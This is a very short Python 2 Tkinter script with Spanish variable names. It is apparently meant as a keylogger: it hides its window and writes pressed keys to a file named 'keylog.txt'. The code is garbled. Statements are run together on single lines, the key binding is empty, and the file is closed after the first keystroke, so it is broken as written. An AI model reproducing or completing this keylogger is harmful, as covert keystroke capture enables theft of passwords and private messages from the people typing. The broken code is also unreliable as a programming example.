import Tkinter as tk

nombre_fichero = "keylog"+".txt" fichero = open(nombre_fichero, "w")

def handleKeypress(event): pressedKey = event.char
fichero.writelines(pressedKey) fichero.close()

mainHandle = tk.Tk() mainHandle.bind_all('', handleKeypress) mainHandle.withdraw() mainHandle.mainloop()
